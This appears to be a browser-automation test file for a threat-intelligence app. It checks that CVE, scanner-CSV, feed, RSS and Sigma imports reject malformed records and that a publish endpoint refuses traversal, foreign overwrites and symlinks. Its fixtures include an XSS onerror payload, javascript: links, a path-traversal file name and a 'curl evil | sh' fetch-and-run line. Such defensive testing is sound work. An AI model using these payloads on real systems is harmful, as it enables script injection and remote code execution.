// t64 — imports and publishing (1.9.2: NV-025, NV-060, NV-061, NV-062, NV-063). From the campaign fuzz (wC N03, N02): the
// NVD/CVE JSON import validates every record (identifier, score, vector), skips and counts, and shows the file errors with the
// summary; the scanner CSV import caps fields at 300 characters and validates scores; one bad feed record never discards a
// file and malformed RSS is reported, per source, in Sources & downloads; the Sigma importer requires logsource and detection;
// /api/publish accepts only the application's own name prefixes and targets and never overwrites a file it did not create.
import { open, ok, done, goto, FEEDS, SHARED, apiHeaders, URL as APPURL, tmp } from './lib.mjs';
import fs from 'fs';
import path from 'path';
const FX = tmp('fixtures-t64'); fs.rmSync(FX, { recursive: true, force: true }); fs.mkdirSync(FX, { recursive: true });
const W = (n, c) => { fs.writeFileSync(path.join(FX, n), c); return path.join(FX, n); };
const PWN = `<img src=x onerror="window.__pwn=(window.__pwn||[]).concat('X')">`;
const nvdHostile = W('nvd_hostile.json', JSON.stringify({ vulnerabilities: [
  { cve: { id: PWN, descriptions: [{ lang: 'en', value: '<script>x</script>' }], metrics: { cvssMetricV40: [{ cvssData: { baseScore: 'NaN', vectorString: PWN } }] } } },
  { cve: null },
  { cve: { id: 'CVE-2099-0001', descriptions: [{ lang: 'en', value: 'Score out of range' }], metrics: { cvssMetricV40: [{ cvssData: { baseScore: 42, vectorString: 'CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N' } }] } } },
  { cve: { id: 'CVE-2099-0002', descriptions: [{ lang: 'en', value: 'Good record ' + 'x'.repeat(500) }], metrics: { cvssMetricV40: [{ cvssData: { baseScore: 9.3, vectorString: 'CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N' } }] }, weaknesses: [{ description: [{ value: 'CWE-79' }, { value: 'not-a-cwe' }] }] } },
  { cve: { id: 'CVE-2099-0003', metrics: { cvssMetricV40: [{ cvssData: { baseScore: 5.5, vectorString: 'javascript:alert(1)' } }] } } },
] }));
const nvdBroken = W('nvd_broken.json', '{"vulnerabilities": [\n{"cve": {"id": "CVE-2099-9');
const csv = W('scanner.csv', 'cve,host,product,cvss,cwe\n"CVE-2024-3400","' + PWN.replace(/"/g, '""') + '","' + 'P'.repeat(2000) + '","NaN","CWE-20"\n"CVE-2024-3401","srv-01","Acme VPN","9.8","CWE-287"\n"no cve here","srv-02","x","1",""\n"CVE-2024-3402","srv-03","Acme","12",""\n');
const { browser, page, errors } = await open('#/process');
await page.evaluate(async () => { const st = await import('/js/state.js'); const ws = st.newWorkspace({ name: 't64 imports' }); await st.create(ws); await st.select(ws.id); });
await page.waitForTimeout(400);
// ---------- 1. NVD / CVE JSON import (NV-025) ----------
await goto(page, '#/vulns', 800);
await page.locator('#panel-vulns .subtabs button', { hasText: 'Import files' }).click(); await page.waitForTimeout(600);
await page.setInputFiles('#panel-vulns input[type=file][accept=".json"]', [nvdHostile, nvdBroken]); await page.waitForTimeout(1200);
let banners = await page.locator('#panel-vulns .banner').allInnerTexts();
let txt = banners.join(' || ').replace(/\s+/g, ' ');
ok(/nvd_broken\.json/.test(txt) && /Not read/.test(txt), 'the truncated file is reported as not read, beside the summary: ' + txt.slice(0, 200));
ok(/3 records read/.test(txt) && /2 skipped/.test(txt) && /repaired/.test(txt), 'summary counts read, skipped and repaired records: ' + (txt.match(/\d+ records read[^|]*/) || [''])[0].slice(0, 160));
const reasons = await page.locator('#panel-vulns ul.small li').allInnerTexts();
ok(reasons.some(r => /is not a CVE/.test(r)) && reasons.some(r => /not within 0–10/.test(r)) && reasons.some(r => /vector of an unexpected shape/.test(r)), 'reasons list the bad identifier, the out-of-range score and the malformed vector: ' + reasons.join(' / ').slice(0, 300));
const V = await page.evaluate(async () => (await import('/js/state.js')).S.ws.vulns.map(v => ({ id: v.id, cvss: v.cvss, vec: v.cvss_vector, cwe: v.cwe, t: (v.title || '').length })));
ok(V.length === 3 && V.every(v => /^CVE-\d{4}-\d{4,}$/.test(v.id)), 'only records with a CVE identifier are stored: ' + V.map(v => v.id).join(', '));
const r1 = V.find(v => v.id === 'CVE-2099-0001'), r2 = V.find(v => v.id === 'CVE-2099-0002'), r3 = V.find(v => v.id === 'CVE-2099-0003');
ok(r1 && r1.cvss === null && r1.vec && r1.vec.startsWith('CVSS:4.0/'), 'a score out of range is dropped, the valid vector kept');
ok(r2 && r2.cvss === 9.3 && r2.cwe.length === 1 && r2.cwe[0] === 'CWE-79' && r2.t <= 300, 'a good record keeps its score, its valid CWE only, and its title is capped at 300');
ok(r3 && r3.cvss === 5.5 && r3.vec === null, 'a vector of an unexpected shape is dropped, the score kept');
ok(!(await page.evaluate(() => window.__pwn)), 'no injected script ran');
// ---------- 2. scanner CSV import (NV-061) ----------
await page.fill('#panel-vulns textarea.code', fs.readFileSync(csv, 'utf8'));
await page.click('#panel-vulns button:has-text("Import") >> nth=-1'); await page.waitForTimeout(1200);
banners = await page.locator('#panel-vulns .banner').allInnerTexts(); txt = banners.join(' || ').replace(/\s+/g, ' ');
ok(/3 records read/.test(txt) && /2 repaired/.test(txt) && /1 row\(s\) without a CVE identifier ignored|row\(s\) without a CVE/.test(await page.locator('#panel-vulns').innerText()), 'CSV summary: 3 CVE rows read, 2 scores repaired, 1 row without a CVE ignored: ' + txt.slice(0, 200));
const C = await page.evaluate(async () => (await import('/js/state.js')).S.ws.vulns.filter(v => /^CVE-2024-340/.test(v.id)).map(v => ({ id: v.id, cvss: v.cvss, p: (v.product || '').length, a: (v.asset || '').length, exposed: v.exposed })));
ok(C.length === 3 && C.every(v => v.p <= 300 && v.a <= 300), 'CSV fields are capped at 300 characters: ' + JSON.stringify(C));
ok(C.find(v => v.id === 'CVE-2024-3400').cvss === null && C.find(v => v.id === 'CVE-2024-3401').cvss === 9.8 && C.find(v => v.id === 'CVE-2024-3402').cvss === null, 'CSV scores: NaN and 12 dropped, 9.8 kept');
ok(C.every(v => v.exposed === true), 'scanner rows mark exposure confirmed (the box was ticked)');
await page.locator('#panel-vulns .subtabs button', { hasText: 'CVE register' }).click(); await page.waitForTimeout(800);
ok(!(await page.evaluate(() => window.__pwn)) && (await page.locator('main [onerror]').count()) === 0, 'register renders hostile values as text');
// ---------- 3. feed files: per-record errors and malformed RSS (NV-062) ----------
const feeds = await page.evaluate(async () => {
  const F = await import('/js/feedparse.js');
  const run = (src, text, fmt) => { try { const its = F.parse(src, text, { fmt: fmt || '' }); return { n: its.length, errors: its.errors, first: its[0] ? { title: its[0].title, url: its[0].url } : null }; } catch (e) { return { throws: String(e.message || e).slice(0, 120) }; } };
  return {
    mbz: run('malwarebazaar', JSON.stringify({ data: [{ signature: 'ok', file_name: 'a', sha256_hash: 'a'.repeat(64) }, { signature: 'bad record without hash' }, { sha256_hash: 'b'.repeat(64), signature: 'Emotet' }] })),
    bsky: run('bluesky-search', JSON.stringify({ posts: [{ record: { text: 'no uri' } }, { uri: 'at://did/app.bsky.feed.post/abc', author: { handle: 'x.bsky.social' }, record: { text: 'CVE-2024-3400 exploited', createdAt: '2026-01-01T00:00:00Z' } }] })),
    otxShape: run('otx', JSON.stringify({ results: 'not a list' })),
    urlhaus: run('urlhaus', JSON.stringify({ urls: [{ id: 1, url: 'javascript:alert(1)', host: 'evil.example', threat: 'malware_download', urlhaus_reference: 'javascript:x' }] })),
    rssBroken: run('cccs-advisories', '<?xml version="1.0"?><rss><channel><item><title>unclosed', 'rss'),
    rssOk: run('cccs-advisories', '<?xml version="1.0"?><rss><channel><item><title>Advisory CVE-2024-3400</title><link>javascript:alert(1)</link></item><item><title>Second</title><link>https://cyber.gc.ca/x</link></item></channel></rss>', 'rss'),
    broken: run('otx', '{"results": [1, 2'),
    empty: run('otx', ''),
  };
});
ok(feeds.mbz.n === 2 && feeds.mbz.errors.length === 1 && /sha256/.test(feeds.mbz.errors[0]), 'malwarebazaar: the record without a hash is skipped and noted, the two others kept: ' + JSON.stringify(feeds.mbz.errors));
ok(feeds.bsky.n === 1 && feeds.bsky.errors.length === 1, 'bluesky: the post without a uri is skipped, the other kept');
ok(feeds.otxShape.n === 0 && feeds.otxShape.errors.length === 1 && /not a list/.test(feeds.otxShape.errors[0]), 'otx with the wrong shape: no throw, one error noted');
ok(feeds.urlhaus.n === 1 && feeds.urlhaus.first.url === '' , 'a javascript: link is dropped from an item');
ok(feeds.rssBroken.throws && /XML/.test(feeds.rssBroken.throws), 'malformed RSS is reported (parsererror), not read as one "(untitled)" item: ' + feeds.rssBroken.throws);
ok(feeds.rssOk.n === 2 && feeds.rssOk.first.url === '' && feeds.rssOk.first.title === 'Advisory CVE-2024-3400', 'well-formed RSS: two items, the javascript: link dropped');
ok(feeds.broken.throws && feeds.empty.throws && /empty file/.test(feeds.empty.throws), 'malformed and empty JSON files throw with a reason');
// the manual load keeps the per-source result (skipped records, unreadable file) and Sources & downloads shows it
const bad = W('mbz.json', JSON.stringify({ data: [{ signature: 'ok', file_name: 'a', sha256_hash: 'c'.repeat(64) }, { signature: 'no hash' }] }));
const brokenXml = W('broken.xml', '<?xml version="1.0"?><rss><channel><item><title>unclosed');
await goto(page, '#/feeds', 1000);
await page.locator('#panel-feeds .subtabs button', { hasText: 'Sources & downloads' }).click(); await page.waitForTimeout(1200);
const srcSel = page.locator('#panel-feeds select').last();
await srcSel.selectOption('malwarebazaar'); await page.setInputFiles('#panel-feeds input[type=file]', bad); await page.click('#panel-feeds button:text-is("Load")'); await page.waitForTimeout(1200);
let srcTable = await page.locator('#panel-feeds table').first().innerText();
ok(/1 record\(s\) skipped/.test(srcTable), 'Sources & downloads shows the skipped record of the source: ' + (srcTable.match(/record\(s\) skipped[^\n]*/) || [''])[0].slice(0, 120));
await page.locator('#panel-feeds select').last().selectOption('isc-diary'); await page.setInputFiles('#panel-feeds input[type=file]', brokenXml); await page.click('#panel-feeds button:text-is("Load")'); await page.waitForTimeout(1200);
srcTable = await page.locator('#panel-feeds table').first().innerText();
ok(/not read/.test(srcTable) && /XML/.test(srcTable), 'a file that could not be read is shown per source, not only toasted: ' + (srcTable.match(/not read[^\n]*/) || [''])[0].slice(0, 120));
// ---------- 4. Sigma importer (NV-063) ----------
const sig = await page.evaluate(async () => {
  const M = await import('/js/siem.js');
  const good = 'title: Good rule\nid: 11111111-1111-1111-1111-111111111111\nstatus: test\nlogsource:\n  product: windows\n  service: security\ndetection:\n  sel:\n    EventID: 4625\n  condition: sel\nlevel: medium\n';
  const noLs = 'title: No logsource\ndetection:\n  sel:\n    EventID: 1\n  condition: sel\n';
  const noDet = 'title: No detection\nlogsource:\n  product: windows\n';
  const notSigma = 'title: Just a title\nauthor: someone\n';
  const strDet = 'title: Detection is text\nlogsource:\n  product: linux\ndetection: {{{{\n';
  const r = M.parseSigma([good, noLs, noDet, notSigma, strDet].join('\n---\n'));
  const imp = await M.importText(noDet, { fileName: 'x.yml', by: 't64' });
  return { rules: r.rules.map(x => x.title), errors: r.errors, impCounts: imp.counts, impErrors: imp.errors };
});
ok(sig.rules.length === 1 && sig.rules[0] === 'Good rule', 'only the document with logsource and detection is a rule: ' + sig.rules.join(', '));
ok(sig.errors.length === 4 && sig.errors.some(e => /\(no logsource mapping\)/.test(e)) && sig.errors.some(e => /\(no detection mapping\)/.test(e)) && sig.errors.some(e => /no logsource and no detection/.test(e)), 'each non-rule is refused with the missing mapping named: ' + sig.errors.join(' / '));
ok((sig.impCounts.rules || 0) === 0 && sig.impErrors.length >= 1, 'importText stores no rule from a document without detection');
// ---------- 5. /api/publish: names, targets, overwrite (NV-060) ----------
fs.rmSync(SHARED, { recursive: true, force: true }); fs.mkdirSync(SHARED, { recursive: true });
const H = await apiHeaders({ 'Content-Type': 'application/json' });
const api = async (p, body, method = 'POST') => { const r = await fetch(APPURL.replace(/\/$/, '') + p, { method, headers: H, body: body ? JSON.stringify(body) : undefined }); return { status: r.status, body: await r.json().catch(() => ({})) }; };
const cfg = (await api('/api/config', null, 'GET')).body.config; cfg.links = { ...(cfg.links || {}), registry_local_dir: SHARED }; ok((await api('/api/config', { config: cfg })).status === 200, 'shared folder set for the test');
const pub = (name, target = 'registry', content = '{"schema":"crg-registry/1"}') => api('/api/publish', { name, content, target });
let r = await pub('crg-registry-anon-2026-11-08.json'); ok(r.status === 200 && fs.existsSync(path.join(SHARED, 'crg-registry-anon-2026-11-08.json')), 'a registry package with the app\'s prefix is written');
r = await pub('crg-registry-anon-2026-11-08.json', 'registry', '{"schema":"crg-registry/1","v":2}'); ok(r.status === 200 && r.body.replaced === true, 'the app may replace its own file (recorded in published.json)');
for (const n of ['claude_desktop_config.json', 'package.json', 'settings.json', 'evil.md', 'report.csv', '.mcp.json', 'crg-registry-../x.json']) { r = await pub(n); ok(r.status === 400 && /not one this application publishes|bad file name/.test(r.body.error || '') && !fs.existsSync(path.join(SHARED, n)), `name refused: ${n} → ${r.status} ${r.body.error}`); }
r = await pub('t.json', '../../x'); ok(r.status === 400 && /unknown publish target/.test(r.body.error || ''), 'unknown target refused (no fallback to the outbox)');
r = await pub('crg-registry-x.json', 'briefing'); ok(r.status === 400, 'a registry name is refused for the briefing target');
r = await pub(`briefing-2026-11-08.md`, 'briefing', '# Weekly threat briefing\n'); ok(r.status === 200 && r.body.path.includes('briefings'), 'a briefing with the app\'s prefix goes to the briefings folder');
fs.writeFileSync(path.join(SHARED, 'crg-registry-foreign-2026-11-08.json'), '{"scripts":{"test":"curl evil | sh"}}');
r = await pub('crg-registry-foreign-2026-11-08.json'); ok(r.status === 409 && /was not created by this application/.test(r.body.error || '') && /curl evil/.test(fs.readFileSync(path.join(SHARED, 'crg-registry-foreign-2026-11-08.json'), 'utf8')), 'a file the app did not create is never overwritten (409), its content intact');
fs.symlinkSync('/etc/hostname', path.join(SHARED, 'crg-registry-link-2026-11-08.md'));
r = await pub('crg-registry-link-2026-11-08.md'); ok(r.status === 409 && fs.lstatSync(path.join(SHARED, 'crg-registry-link-2026-11-08.md')).isSymbolicLink(), 'a symbolic link under an app name is refused, not followed');
ok(fs.existsSync(path.join(FEEDS, 'published.json')) && !(await api('/api/files', null, 'GET')).body.files.some(f => f.name === 'published.json'), 'the record of published files exists and is not listed as a catalogue file');
cfg.links.registry_local_dir = ''; await api('/api/config', { config: cfg });
ok(errors.length === 0, 'no console error: ' + errors.join(' | ').slice(0, 300));
await browser.close(); done('t64 imports & publish');
